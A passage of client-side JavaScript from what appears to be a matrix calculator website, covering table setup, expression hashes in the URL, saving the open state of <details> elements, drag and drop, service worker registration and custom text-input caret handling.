      //TODO: :target - ?
    } else {
      element.scrollIntoViewIfNeeded(false);
    }
    grow(element, resdiv, resultsContainer);//!
    actHistoryStorage.setItem(actHistoryId, ActHistoryStorage.createItem({
      resultHTML: resultHTML,
      resultMatrix: resultMatrix,
      details: details,
      expressionString: expressionString,
      actHistoryId: undefined,
      detailsHTML: detailsHTML,
      version: ActHistoryStorage.itemVersion,
      timestamp: new Date(Date.now()).toISOString()
    }));
  }
};

//TODO: assign id instead to the <details> - ?
function getKey(element) {
  var key = [];
  var e = element;
  while (e != null && e.id === '') {
    // https://stackoverflow.com/a/57503796/839199
    var index = 0;
    var c = e.previousElementSibling;
    while (c != null) {
      if (c.tagName.toLowerCase() === e.tagName.toLowerCase()) {
        index += 1;
      }
      c = c.previousElementSibling;
    }
    key.push(e.tagName.toLowerCase() + ':nth-of-type(' + index + ')');
    e = e.parentNode;
  }
  if (e != null) {
    key.push('#' + e.id);
  }
  key.reverse();
  return key.join(' > ');
}

// .details-container > <details> > <summary>
Utils.initialize("details", function (element) {
  //var details = element.firstElementChild;
  var details = element;
  var summary = details.firstElementChild;
  if (details.initDetails != null) {
    details.initDetails(summary);
  }
  details.addEventListener("toggle", function (event) {
    Utils.check1(event.target);
  }, false);
  details.addEventListener("toggle", function (event) {
    var element = event.target;
    var detailsAttribute = element.getAttribute("data-details");
    if (detailsAttribute == undefined) {
      return;
    }
    element.removeAttribute("data-details");
    var idPrefix = element.getAttribute("data-id-prefix");
    var printOptions = {idPrefix: idPrefix, rounding: decimalRounding};
    var x = JSON.parse(detailsAttribute);
    var e = element.firstElementChild.nextElementSibling;
    hit({details: x.type});//!
    (waitExpression(function () {
      RPNProxy.getDetails(x, printOptions).then(function (html) {
        //TODO: progress indication (?)
        var tmp = document.createElement('div');
        tmp.innerHTML = html;
        e.appendChild(tmp);
        Utils.check(tmp);
      });
    })());
  }, false);
  summary.addEventListener("mousedown", function (event) {
    if (event.detail > 1) {
      event.preventDefault();
    }
  }, false);

  //!new 2019-08-29
  // keep the state of <details> in the history.state:
    var historyState = window.history.state;
    if (historyState != null) {
      var state = historyState.detailsSummary;
      if (state != null) {
        var key = getKey(details);
        if (state[key] != null) {
          summary.click();
        }
      }
    }

});

function canSaveStateOnPageHide() {
  if (!('onpagehide' in window)) {
    return false; // IE 10
  }
  //TODO: fix
  //TODO: Chrome bug
  return !('onfreeze' in document); // it is not a Chrome
}

  window.addEventListener(!canSaveStateOnPageHide() ? "beforeunload" : "pagehide", function (event) {
    var detailsSummary = {};
    var es = document.querySelectorAll("details[open]");
    for (var i = 0; i < es.length; i++) {
      var key =  getKey(es[i]);
      detailsSummary[key] = true;
    }
    var historyState = Object.assign({}, window.history.state);
    historyState.detailsSummary = detailsSummary;
    window.history.replaceState(historyState, document.title, window.location.href);
  }, !canSaveStateOnPageHide() ? {once: true, passive: true} : false);

Utils.on("click", ".change-button", function (event) {
  hit({click: "change-button"});
  var s1 = this.getAttribute("data-for1");
  var s2 = this.getAttribute("data-for2");
  var table1 = MatrixTables[s1];
  var table2 = MatrixTables[s2];
  var t1 = table1.getState();
  var t2 = table2.getState();
  table1.insert(t2);
  table2.insert(t1);
});

// ---------------------------------------- cookies -----------------------------------------------

var onInputExampleLinkClick = waitExpression(function (event) {
  hit({click: "input-example-link"});


//super hack
  event.preventDefault();
  var s = this.parentNode.parentNode.querySelector(".input-example-code").textContent;
  s = s.replace(/\u0020+/g, " ").trim().replace(/\n\u0020/g, "\n");
  var mt = MatrixTables["A"];
  if (mt.mode === "cells") {
    mt.container.querySelector(".swap-mode-button").click();
  }
  RPNProxy.getElementsArray(mt.getDataState()).then(function (result) {//introduce delay, as onswapmode is also async
  updateInputValue(mt.textarea, s);
  // for some reasons `mt.textarea.focus()` does not scroll to show the full textarea in Chrome sometimes
  window.setTimeout(function () {
    mt.container.scrollIntoViewIfNeeded(false);
  }, 150);
  });
});

Utils.initialize(".input-example-link-container", function (element) {
  element.firstElementChild.onclick = onInputExampleLinkClick;
});



// detfindDet

Utils.initialize(".insert-table", function (element) {
  var id = element.getAttribute("data-id");
  var sizes = element.getAttribute("data-sizes") || "";
  var type = element.getAttribute("data-type") || "simple";

  var initialRows = 3;
  var initialCols = 3;
  var match = (/^(\d+)x(\d+)$/).exec(sizes);
  if (match != undefined) {
    initialRows = Number(match[1]);
    initialCols = Number(match[2]);
  }

  var state = undefined;
  var stateKey1 = id + "1";

    var historyState = window.history.state;
    if (historyState != null && historyState[stateKey1] != null) {
      state = historyState[stateKey1];
    }

  if (state == undefined) {
    state = {
      mode: undefined,
      inputValues: null,
      textareaValue: null,
      rows: initialRows,
      cols: initialCols,
      textareaStyleWidth: undefined,
      textareaStyleHeight: undefined
    };
  }
  //TODO: do we need a title attribute at insert-table and why if we have <legend> ?
  var x = new MatrixTable(id, initialRows, initialCols, type, element);
  //element.style.visibility = "hidden";
  var modeKey = "~" + window.location.pathname + "~" + id + "~" + "mode";
  var mode = keyStorage.getItem(modeKey);
  if (mode == undefined) {
    var initialMode = undefined;
    //use the mode from the last table:
    for (var tableName in MatrixTables) {
      if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
        initialMode = MatrixTables[tableName].mode;
      }
    }
    if (initialMode == undefined) {
      //as table of inputs does not work well on mobile phones (on Android the virtual keyboard is swithed to the alphabetical on every focus change)
      initialMode = !window.matchMedia("(pointer: fine)").matches ? '' : 'cells';
    }
    mode = initialMode;
    //mode = x.mode;
  }
  MatrixTables[id] = x;
  x.mode = mode;
  x.insert(state);
  //element.style.visibility = "";
  x.onmodechange = function () {
    keyStorage.setItem(modeKey, x.mode);
  };
  x.onswapmode = function () {
    var newMode = x.mode === "cells" ? "" : "cells";
    RPNProxy.getElementsArray(x.getDataState()).then(function (result) {
      var elements = result.elements;
      var variableNames = result.variableNames;
      x.insert({
        inputValues: elements,
        mode: newMode,
        variableNames: variableNames
      });
    });
  };
  DnD.initializeDropZone(element);

});

  // TODO: save new tables to the history.state, don't restore old
    window.addEventListener(!canSaveStateOnPageHide() ? "beforeunload" : "pagehide", function (event) {
      var historyState = Object.assign({}, window.history.state);
      for (var tableName in MatrixTables) {
        if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
          var stateKey1 = tableName + "1";
          historyState[stateKey1] = MatrixTables[tableName].getState();
        }
      }
      window.history.replaceState(historyState, document.title, window.location.href);
    }, !canSaveStateOnPageHide() ? {once: true, passive: true} : false);

Utils.on("click", ".expression-button", onExpressionClick);

Utils.on("click", ".polynomial-expression-button", function (event) {
  var e = event.target.getAttribute('data-p-expression');
  var valid = true;
  if (e.indexOf('A') !== -1) {
    e = e.replaceAll('A', document.getElementById('A').value);
    valid = valid && document.getElementById('A').value !== '';
  }
  if (e.indexOf('B') !== -1) {
    e = e.replaceAll('B', document.getElementById('B').value);
    valid = valid && document.getElementById('B').value !== '';
  }
  //TODO: !?
  if (valid) {
    event.preventDefault();
    event.target.setAttribute('data-expression', e);
    onExpressionClick.call(this, event);
  }
});


Utils.on("click", ".expression-input-button", onExpressionClick);

Utils.initialize(".expression-input-container", function (element) {
  var input = element.querySelector("input");

  var form = element;
  addClickOnEnter(element);// focus is moved to button in IE 11 otherwise
  form.addEventListener('submit', function (event) {
    event.preventDefault();
  }, false);

  input.addEventListener("input", function (event) {
    event.target.style.width = ch(Math.max(38, event.target.value.length + 2 + 2) + "ch"); // + 2 as it has a list
  }, false);

  if (input.value === input.getAttribute("value")) { // autofill
    //input.disabled = true;
    var value = keyStorage.getItem("expression");
    if (value != undefined && value !== "") {
      //input.value = value;
      updateInputValue(input, value);
    }
    input.addEventListener("input", function (event) {
      var input = event.target;
      checkInput(input, "");
    }, false);
    checkInput(input, "");
    //input.disabled = false;
  }

  // transformation of multi-line form into single-line form
  input.addEventListener("drop", DnD.onDropOrPaste, false);
  input.addEventListener("paste", DnD.onDropOrPaste, false);
});

var encodeLocationHash = function (hash) {

  //var url = new URL('https://example.com/');
  //url.hash = hash;
  //return hash.slice('#'.length);

  // twitter.com does not support {} in hash, seems
  // comments systems, other software with "auto-link" feature may work not good with some characters ...
  // update: 2021-07-27: *, (, ) - not encoded
  // update: encode (, )
  // TODO: ^ - replace by ** - ?
  return encodeURIComponent(hash).replace(/[\!'\.~\(\)]/g, function (p) {
                                   return '%' + p.charCodeAt(0).toString(16);
                                 })
                                 // / - 2018-07-09
                                 // &, +, _ - 2020-08-02
                                 .replace(/%26|%2B|%2C|%2F|%3D/g, function (p) {
                                   return decodeURIComponent(p);
                                 });
};

// https://stackoverflow.com/questions/7449588/why-does-decodeuricomponent-lock-up-my-browser
function decodeURIComponentSafe(string) {
  var validPercentEncoding = /(?:%[0-7][0-9A-F]|%(?!C[0-1])[C-D][0-9A-F]%[8-9A-B][0-9A-F]|%(?!E0%[8-9])(?!ED%[A-B])E[0-9A-F](?:%[8-9A-B][0-9A-F]){2}|%(?!F0%8)(?!F4%[9A-B])F[0-4](?:%[8-9A-B][0-9A-F]){3}|[^%])+/gi;
  return string.replace(validPercentEncoding, function (p) {
    return decodeURIComponent(p);
  });
}

var decodeLocationHash = function (hash) {
  // determinant-Gauss%28%7B%7B0,z,y,u%7D,%7Bz,z,u%2By,u%2By%7D,%7Bu%2By,u%2By,z,z%7D,%7Bu,y,z,0%7D%7D%29
  return decodeURIComponentSafe(hash);
};

var lastHash = "";

var onHashChange = function (event) {
  var hash = decodeLocationHash(window.location.hash.slice(1));
  if (lastHash === hash) {
    return;
  }
  lastHash = hash;

  if (document.getElementById(hash) != undefined) {
    return;
  }
  //TODO: (?)
  if (/^hcm\=\d+$/.exec(hash) != undefined) { // || document.getElementById(hash) != undefined
    return;
  }
  if (/^[\-\da-zA-Z]*system_1$/.exec(hash) != undefined) { // || document.getElementById(hash) != undefined
    return;
  }
  if (hash.trim() === "") {
    return;
  }

  var actHistoryId = (actHistoryStorage.actHistoryId += 1);
  var printOptions = {idPrefix: "i" + actHistoryId.toString(), rounding: decimalRounding};
  document.body.style.cursor = 'wait';//TODO: on mobile
  //TODO: FIX!!!
  RPNProxy.runExpression(hash, undefined, undefined, undefined, printOptions).then(function (result) {
    document.body.style.cursor = '';
    var resultError = result.resultError;
    var details = result.details;
    var expressionString = result.expressionString;
    var resultHTML = result.resultHTML;
    var resultMatrix = result.resultMatrix;
    var detailsHTML = result.detailsHTML;
    if (resultError == undefined) {
      var previousItem = actHistoryStorage.getPreviousItem();
      //...
      // TODO: FIX!!! It is wrong to compare HTML here, as "Expression.id()" generates different HTML each time
      if (previousItem == undefined || (previousItem.resultHTML !== resultHTML && previousItem.expressionString !== expressionString)) {
        zInsAct(resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, {isLoading: false, fromHashChange: true});
      }
    } else {
      //if (resultError.message.indexOf("UserError:") === 0) {
        //ignore
      //} else {
      RPNProxy.getPositionInfo().then(function (positionInfo) {//TODO: REMOVE
        handleError(hash, "location.hash", resultError, positionInfo);
      });
      //}
    }
  });
};

document.addEventListener('submit', function (event) {
  if (event.target.matches('.main-form')) {
    event.preventDefault();
    event.target.setAttribute('data-expression', (event.target.elements.solveExpression || event.target.elements.determinantExpression).value);
    onExpressionClick.call(event.target);
  }
}, false);

Utils.initialize(".an-autocomplete", function (element) {
  element.addEventListener("change", function (event) {
    var value = event.target.value;
    keyStorage.setItem(element.name, value);
  }, false);
  var value = keyStorage.getItem(element.name);
  if (value != undefined) {
    element.value = value;
    element.dispatchEvent(new Event('change'));
  }
});

Utils.initialize(".determinant-expression", function (element) {
  var onChange = function (event) {
    var value = event.target.value;
    document.getElementById('rowNumber').parentNode.style.display = value.indexOf('-row k') === -1 ? 'none' : '';
    document.getElementById('columnNumber').parentNode.style.display = value.indexOf('-column k') === -1 ? 'none' : '';
  };
  element.querySelector('select').addEventListener('change', onChange, false);
  onChange({target: element.querySelector('select')});
});

Utils.initialize(".from-cookie", function (element) {

  if ((window.navigator.platform || '').indexOf('Mac') === 0) {
    document.body.classList.add('mac');
  }

  // TODO: insert after the <details> element expansion - ? and calculate - ?
  (waitExpression(function () {
  var examples = document.getElementById("examples");
  if (examples != undefined) {
    var list = examples.querySelectorAll("a");
    var fill = function (code) {
      var s = code.textContent;
      RPNProxy.toMathML(s, {idPrefix: "g", useMatrixContainer: false}).then(function (mathml) {
        var tmp = document.createElement("div");
        tmp.innerHTML = "<math>" + mathml + "</math>";
        code.parentNode.insertBefore(tmp.firstElementChild, code);
        code.parentNode.removeChild(code);
      });
    };
    for (var i = 0; i < list.length; i += 1) {
      var code = list[i].querySelector("code");
      fill(code);
    }
  }
  })());

Utils.waitI18n(waitExpression(function () {
  waitActHistory(function (storedActHistory) {
    var exampleAttribute = element.getAttribute("data-example");
    var needsExample = exampleAttribute != undefined;
    var oldVersion = ActHistoryStorage.itemVersion;
    if (true) {
      for (var actHistoryId in storedActHistory) {
        if (Object.prototype.hasOwnProperty.call(storedActHistory, actHistoryId)) {
          var storedActHistoryItem = storedActHistory[actHistoryId].item;
          zInsAct(storedActHistoryItem.resultHTML,
                  storedActHistoryItem.resultMatrix,
                  storedActHistoryItem.details,
                  storedActHistoryItem.expressionString,
                  actHistoryId,
                  storedActHistoryItem.detailsHTML,
                  {isLoading: true});
          needsExample = false;
          oldVersion = Math.min(oldVersion, storedActHistoryItem.oldVersion);
          if (storedActHistoryItem.expressionString == undefined) {
            oldVersion = -1;
          }
        }
      }
      //if (oldVersion !== ActHistoryStorage.itemVersion) {
        //..
      //}
      if (storedActHistory.length !== 0) {
        hit({version: "version-" + oldVersion});
      }
    }
    //TODO: remove waitExpression for example (?) when location.hash === ""
    window.addEventListener("hashchange", onHashChange, false);
    onHashChange(undefined);
    needsExample = needsExample && actHistoryStorage.size() === 0;
    if (needsExample) {
      var printOptions = {idPrefix: "example"};
      RPNProxy.runExpression("{{5,8,-4},{6,9,-5},{4,7,-2}}*{{2},{-3},{1}}", undefined, undefined, undefined, printOptions).then(function (result) {
        if (result.resultError == undefined) {
          // TODO: isLoading or not isLoading - ?
          var actHistoryId = "#" + result.resultMatrix;
          zInsAct(result.resultHTML, result.resultMatrix, result.details, result.expressionString, actHistoryId, result.detailsHTML, {isLoading: true});
          //! Note:
          //! No need to save the example
        } else {
          handleError("", "", result.resultError, {});
        }
      });
    }
  });
}));

  var pathname = window.location.pathname;
  var links = document.querySelector(".menu").querySelectorAll("a");
  for (var i = 0; i < links.length; i += 1) {
    if (links[i].pathname === pathname) {
      links[i].setAttribute('aria-current', 'page');
    }
  }

});

// --------------------------------------------- end ----------------------------------------------

//  Drag and Drop + Copy and Paste

var toggleValidDropTarget = function (force) {
  //document.body.classList.toggle("drop-target", force);
  var dropzones = document.querySelectorAll(".matrix-table");
  for (var i = 0; i < dropzones.length; i += 1) {
    dropzones[i].classList.toggle("valid-drop-target", force);
  }
  var expressionInput = document.getElementById("expression");
  if (expressionInput != undefined) {
    expressionInput.classList.toggle("valid-drop-target", force);
  }
  var addTableButton = document.querySelector(".add-table");
  if (addTableButton != null) {
    addTableButton.classList.toggle("valid-drop-target", force);
  }
};
DnD.hasInterestingData = function (dataTransfer) {
  // TODO: types is null in Safari 10
  // types returns null in IE 11
  var types = dataTransfer.types || ['text/plain'];
  for (var i = 0; i < types.length; i += 1) {
    var type = types[i];
    if (type === "text/plain" ||
        type === "application/mathml-presentation+xml" ||
        (typeof TextDetector !== "undefined" && type === "Files")) {//TODO: /^image\//.test(event.dataTransfer.items[i].type)
      return true;
    }
  }
  return false;
};
var onDragOverOrDragEnd = function (event) {
  if (!DnD.hasInterestingData(event.dataTransfer)) {
    return;
  }
  var key = "data-drop-target-timeout";
  var a = Number(document.body.getAttribute(key) || 0) || 0;
  if (a !== 0) {
    window.clearTimeout(a);
  } else {
    toggleValidDropTarget(true);
  }
  a = window.setTimeout(function () {
    toggleValidDropTarget(false);
    document.body.setAttribute(key, "0");
  }, event.type === "dragend" ? 0 : 600);
  document.body.setAttribute(key, a.toString());
};

document.addEventListener("dragover", onDragOverOrDragEnd, false);
document.addEventListener("dragend", onDragOverOrDragEnd, false);

//

var arrowWithLabelInitialize = function (arrowWithLabel) {
  var arrow = arrowWithLabel.querySelector(".arrow");
  var table = arrowWithLabel.previousElementSibling.querySelector("mtable");
  var start = Number(arrowWithLabel.getAttribute("data-start"));
  var end = Number(arrowWithLabel.getAttribute("data-end"));
  var n = 0;
  var row = table.firstElementChild;
  var startRow = undefined;
  var endRow = undefined;
  while (row != undefined) {
    if (n === start) {
      startRow = row;
    }
    if (n === end) {
      endRow = row;
    }
    n += 1;
    row = row.nextElementSibling;
  }
  var startRowRect = startRow.getBoundingClientRect();
  var endRowRect = endRow.getBoundingClientRect();
  var tableRect = table.getBoundingClientRect();
  if (end < start) {
    var tmp = endRowRect;
    endRowRect = startRowRect;
    startRowRect = tmp;
  }
  var arrowHeight = ((endRowRect.top + endRowRect.bottom) / 2 - (startRowRect.top + startRowRect.bottom) / 2);
  var arrowWithLabelVerticalAlign = ((tableRect.top + tableRect.bottom) / 2 - (startRowRect.top + endRowRect.bottom) / 2);
  window.requestAnimationFrame(function () {
    arrow.style.height = arrowHeight.toString() + "px";
    arrow.style.top = "50%";
    arrow.style.marginTop = (-arrowHeight / 2).toString() + "px";
    arrowWithLabel.style.verticalAlign = arrowWithLabelVerticalAlign.toString() + "px";
  });
};

document.addEventListener("custom-paint", function (event) {
  if (event.target.getAttribute("data-custom-paint") === "arrow-with-label") {
    arrowWithLabelInitialize(event.target);
  }
}, false);

if ("navigationMode" in window.history) {
  window.history.navigationMode = "fast"; // - Opera Presto
}



if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1") {
  var useAppCache = function () {
    var onDOMReady = function (event) {
      // https://www.youtube.com/watch?v=IgckqIjvR9U&t=1005s
      var iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "load-appcache.html";
      document.body.appendChild(iframe);
    };
    if (document.readyState === "interactive" || document.readyState === "complete") {
      window.setTimeout(function () {
        onDOMReady(null);
      }, 0);
    } else {
      document.addEventListener("DOMContentLoaded", onDOMReady, {once: true});
    }
  };
  if (("serviceWorker" in window.navigator)) {
    var serviceWorker = undefined;
    try {
      serviceWorker = window.navigator.serviceWorker;
    } catch (error) {
      if (error.name !== "SecurityError") {
        throw error;
      }
    }
    if (serviceWorker != undefined) {
      var promise = serviceWorker.register('sw.js', {scope: "./"});
      if (promise.then != undefined) {
        promise.then(function (registration) {
          console.log("ServiceWorker registration succeeded:", registration);
          //TODO:
          // reload the page if the user has not interacted with the page yet and the major version is bigger (?)
          //registration.onupdatefound = function () {
          //  var installingWorker = registration.installing;
          //  installingWorker.onstatechange = function (event) {
          //    if (installingWorker.state === "activated") {
          //      window.location.reload();
          //    }
          //  };
          //};
        })["catch"](function (error) {
          useAppCache();
          console.log("ServiceWorker registration failed:", error);
        });
      }
    } else {
      useAppCache();
    }
  } else {
    useAppCache();
  }
}

window.addEventListener("beforeinstallprompt", function (event) {
  event.preventDefault(); // most of users do not accept it
  //if (event.userChoice != undefined) {
  //  event.userChoice.then(function (choiceResult) {
  //    hit({beforeinstallprompt: choiceResult.outcome});
  //  });
  //}
  hit({beforeinstallprompt: "show"});

  var installButton = document.getElementById('add-to-homescreen-button');
  if (installButton != null) {
    installButton.onclick = function (mouseEvent) {
      event.prompt();
    };
    installButton.hidden = false;
  }
}, false);

(function () {
  var onDOMReady = function (event) {
    var shareButton = document.getElementById('share-button');
    if (shareButton != null) {
      if (window.navigator.share != undefined) {
        shareButton.onclick = function (event) {
          window.navigator.share({
            title: decodeURIComponent(shareButton.getAttribute("data-text")),
            url: decodeURIComponent(shareButton.getAttribute("data-url"))
          });
        };
      } else {
        shareButton.hidden = true;
      }
    }
  };
  if (document.readyState === "interactive" || document.readyState === "complete") {
    window.setTimeout(function () {
      onDOMReady(null);
    }, 0);
  } else {
    document.addEventListener("DOMContentLoaded", onDOMReady, {once: true});
  }
}());

Utils.on("click", ".share-item-button", function (event) {
  var actHistoryId = this.getAttribute("data-act-history-id");
  var item = actHistoryId.slice(0, 1) === "#" ? {expressionString: actHistoryId.slice(1)} : actHistoryStorage.getItem(Number(actHistoryId));
  window.navigator.share({
    url: "#" + encodeLocationHash(item.expressionString)
  });
});

Utils.initialize(".more-button", function (button) {
  var container = button.previousElementSibling;
  button.onclick = function () {
    container.hidden = !container.hidden;
    button.setAttribute("aria-expanded", container.hidden ? "true" : "false");
  };
});

//! 2018-03-20
var onMatrixTable = function () {
  //!
  var matrixMenu = document.getElementById("matrix-menu");
  if (matrixMenu != undefined) {
    matrixMenu.parentNode.removeChild(matrixMenu);
  }
  var matrixMenuDialog = document.getElementById("matrix-menu-dialog");
  if (matrixMenuDialog != undefined) {
    matrixMenuDialog.parentNode.removeChild(matrixMenuDialog);
  }
};

var addTableTemplate = document.createElement('div');
addTableTemplate.innerHTML = '<div class="tdmatrix">' +
                             '<fieldset>' +
                             '<legend align="center"><span></span><button type="button" class="remove-table" data-id="X" title="">✗</button></legend>' +
                             '<div class="insert-table" data-id="X" data-sizes="3x3" data-type="simple"></div>' +
                             '</fieldset>' +
                             '</div>';

var storedTables = {};

function addTable(id) {
  var tableNode = document.querySelector('.matrix-table[data-id="' + id + '"]');
  var tdNode = tableNode != null ? tableNode.closest('.tdmatrix') : null;
  if (tdNode != null) {
    tdNode.style.display = '';
    MatrixTables[id] = storedTables[id];
    MatrixTables[id]._resizeTable(MatrixTables[id].initRows, MatrixTables[id].initCols);
  } else {
    var newNode = addTableTemplate.firstElementChild.cloneNode(true);
    newNode.querySelector("legend").querySelector("span").textContent = i18n.index.matrix + ' ' + id + i18n.colonSpacing + ': ';
    newNode.querySelector(".remove-table").setAttribute("data-id", id);
    newNode.querySelector(".remove-table").title = i18n.buttons.removeTable;
    newNode.querySelector(".insert-table").setAttribute("data-id", id);
    document.querySelector(".main").appendChild(newNode);
    Utils.check(newNode);
  }
  onMatrixTable();
}

function removeTable(id) {
  storedTables[id] = MatrixTables[id];
  MatrixTables[id]._resizeTable(-1 / 0, -1 / 0); //!new 2020-03-22 (To save hidden <input> elements)
  delete MatrixTables[id];
  var tdNode = document.querySelector('.matrix-table[data-id="' + id + '"]').closest('.tdmatrix');
  if (tdNode != null) {
    //tdNode.parentNode.removeChild(tdNode);
    tdNode.style.display = 'none';
  }
  //TODO: update history state when hiding (?)
  //TODO: restore from the history state the table on back button click
  //TODO: set focus to the previous element (?)
  onMatrixTable();
}

function getNextTableId() {
  var id = undefined;
  for (var c = "A"; c <= "Z"; c = String.fromCharCode(c.charCodeAt(0) + 1)) {
    if (id == undefined && MatrixTables[c] == undefined) {
      id = c;
    }
  }
  return id;
}

//button
Utils.initialize(".add-table", function (element) {
  element.addEventListener("click", function (event) {
  hit({click: "add-table"});
  var id = getNextTableId();
  if (id == undefined) {
    throw new TypeError("Not implemented!");
  }
  addTable(id);
  }, false);

  //!new 2019-01-06
  // Note: "paste" event is not working in Chrome 71?
  DnD.initializeDropZone(element);

  Utils.waitI18n(function () {//TODO: ?
  var historyState = window.history.state;
  if (historyState != null) {
    for (var key in historyState) {
      if (Object.prototype.hasOwnProperty.call(historyState, key)) {
        if (/^[A-Z]1$/.test(key)) {//TODO: ?
          var id = key.slice(0, -1);
          if (MatrixTables[id] == undefined) {
            addTable(id);
          }
        }
      }
    }
  }
  }, 0);
});
//button
Utils.on("click", ".remove-table", function (event) {
  hit({click: "remove-table"});
  var id = event.target.getAttribute("data-id");
  removeTable(id);
});

  function makeContent(variableName) {
    return MatrixTableBase.makeContent(variableName);
  }

Utils.initialize(".editable-on-click", function (element) {
  element.innerHTML = '<button type="button"></button><input type="text" pattern="[a-z](?:_\\d+)?" autocapitalize="off" autocomplete="off" spellcheck="false" enterkeyhint="done" hidden />';
  var button = element.querySelector("button");
  var input = element.querySelector("input");
  input.value = element.getAttribute('data-value');
  button.innerHTML = '<math>' + makeContent(element.getAttribute('data-value')) + '</math>';
  // Firefox will not insert a new character into the <input> if to switch during "keypress"
  element.addEventListener("keydown", function (event) {
    if (!event.defaultPrevented && !event.ctrlKey && !event.shiftKey && !event.metaKey && !event.altKey) {
      var charCode = String.fromCharCode(event.keyCode).toLowerCase().charCodeAt(0);
      if (charCode >= "a".charCodeAt(0) && charCode <= "z".charCodeAt(0)) {
        if (!button.hidden) {
          button.click();
        }
      }
    }
  }, false);
  function updateValue() {
    var value = input.value.trim();
    element.setAttribute("data-value", value);
    button.innerHTML = '<math>' + makeContent(value) + '</math>';
    element.dispatchEvent(new Event('change-value'));
  }
  element.addEventListener("click", function (event) {
    if (!event.defaultPrevented) {
      event.preventDefault();
      button.hidden = true;
      input.hidden = false;
      input.focus();
      input.select();
      input.addEventListener("blur", function (event) {
        var value = input.value.trim();
        if (element.getAttribute("data-value") !== value && value !== "") {
          updateValue();
        }
        button.hidden = false;
        input.hidden = true;
      }, false);
      input.addEventListener("keydown", function (event) {
        var DOM_VK_RETURN = 13;
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE) {
          updateInputValue(input, element.getAttribute("data-value"));
          event.preventDefault();
          button.hidden = false;
          button.focus();
          input.hidden = true;
        }
        if (event.keyCode === DOM_VK_RETURN) {
          if (input.value.trim() === "") {
            updateInputValue(input, element.getAttribute("data-value"));
          }
          event.preventDefault();
          updateValue();
          button.hidden = false;
          button.focus();
          input.hidden = true;
        }
      }, false);
      input.addEventListener("input", function (event) {
        input.style.width = ch((input.value.length + 2) + "ch");
      }, false);
    }
  }, false);
});

}());

'use strict';


if (window.customElements != null) { // IE 8 does not support getters/setters on non-DOM objects
(function () {

  // https://bugzilla.mozilla.org/show_bug.cgi?id=1291467
  // Use beforeinput event to implement contenteditable="plaintext-only":
  document.addEventListener('beforeinput', function (event) {
    var inputType = event.inputType;
    if (inputType !== 'insertText') {
      if (event.target.tagName.toLowerCase() === 'custom-input') {
        if (inputType === 'insertParagraph' ||
            inputType === 'insertLineBreak') { // Enter or Shift+Enter
          if (event.target.getAttribute('aria-multiline') !== 'true') {
            event.preventDefault();
          }
        } else if (inputType === 'insertFromPaste' ||
                   inputType === 'insertFromDrop' ||
                   inputType === 'insertReplacementText') {
          event.preventDefault();
          var insertion = event.data || event.dataTransfer.getData('text/plain');
          if (event.target.getAttribute('aria-multiline') !== 'true') {
            insertion = insertion.replace(/[\r\n]/g, '');
          }
          document.execCommand('insertText', false, insertion);
        } else if (inputType === 'insertText' ||
                   inputType === 'insertCompositionText') {
          var insertion = event.data;
          if (event.target.getAttribute('aria-multiline') !== 'true' && /[\r\n]/.test(event.data)) {
            event.preventDefault();
            insertion = insertion.replace(/[\r\n]/g, '');
            document.execCommand('insertText', false, insertion);
          }
        } else if (inputType === 'formatBold' ||
                   inputType === 'formatItalic' ||
                   inputType === 'formatUnderline') { // Ctrl+B, Ctrl+I, Ctrl+U
          event.preventDefault();
        } else if (inputType === 'historyUndo' ||
                   inputType === 'historyRedo' ||
                   inputType === 'deleteByCut' ||
                   inputType === 'deleteByDrag' ||
                   inputType === 'deleteContentBackward' ||
                   inputType === 'deleteContentForward' ||
                   inputType === 'deleteWordBackward' ||
                   inputType === 'deleteWordForward') {
          // do nothing
        } else {
          throw new TypeError('unexpected inputType: ' + inputType);
        }
      }
    }
  }, false);

  function isAfter(container, offset, node) {
    var c = node;
    while (c.parentNode != container) {
      c = c.parentNode;
    }
    var i = offset;
    while (c != null && i > 0) {
      c = c.previousSibling;
      i -= 1;
    }
    return i > 0;
  }
  function compareCaretPositons(node1, offset1, node2, offset2) {
    if (node1 === node2) {
      return offset1 - offset2;
    }
    var c = node1.compareDocumentPosition(node2);
    if ((c & Node.DOCUMENT_POSITION_CONTAINED_BY) !== 0) {
      return isAfter(node1, offset1, node2) ? +1 : -1;
    } else if ((c & Node.DOCUMENT_POSITION_CONTAINS) !== 0) {
      return isAfter(node2, offset2, node1) ? -1 : +1;
    } else if ((c & Node.DOCUMENT_POSITION_FOLLOWING) !== 0) {
      return -1;
    } else if ((c & Node.DOCUMENT_POSITION_PRECEDING) !== 0) {
      return +1;
    }
  }

  function stringifyElementStart(node, isLineStart) {
    if (node.tagName.toLowerCase() === 'br') {
      return '\n';
    }
    if (node.tagName.toLowerCase() === 'div') { // Is a block-level element?
      if (!isLineStart) { //TODO: Is not at start of a line?
        return '\n';
      }
    }
    return '';
  }
  function positions(node, isLineStart) {
    isLineStart = isLineStart == undefined ? true : isLineStart;
    console.assert(node.nodeType === Node.ELEMENT_NODE);
    var child = node.firstChild;
    var offset = 0;
    var state = 0;
    var i = null;
    var x = null;
    return {
      next: function () {
        while (i != null) {
          x = i.next();
          if (!x.done) {
            return {value: x.value, done: false};
          }
          i = null;
          isLineStart = x.value;
        }
        if (state === 0) {
          state = 1;
          return {value: {node: node, offset: offset, text: stringifyElementStart(node, isLineStart)}, done: false};
        }
        while (child != null) {
          if (state === 1) {
            if (child.nodeType === Node.TEXT_NODE) {
              isLineStart = false;
              state = 2;
              return {value: {node: child, offset: 0/0, text: child.data}, done: false};
            } else {
              state = 2;
              i = positions(child, isLineStart);
              x = i.next();
              if (!x.done) {
                return {value: x.value, done: false};
              }
              isLineStart = x.value;
              i = null;
            }
          }
          if (state === 2) {
            offset += 1;
            state = 3;
            return {value: {node: node, offset: offset, text: ''}, done: false};
          }
          child = child.nextSibling;
          console.assert(state === 3);
          state = 1;
        }
        return {value: isLineStart, done: true};
      }
    };
  }
  function getCaretPosition(contenteditable, textPosition) {
    var textOffset = 0;
    var lastNode = null;
    var lastOffset = 0;
    for (var i = positions(contenteditable), x = i.next(); !x.done; x = i.next()) {
      var p = x.value;
      if (p.text.length > textPosition - textOffset) {
        return {node: p.node, offset: p.node.nodeType === Node.TEXT_NODE ? textPosition - textOffset : p.offset};
      }
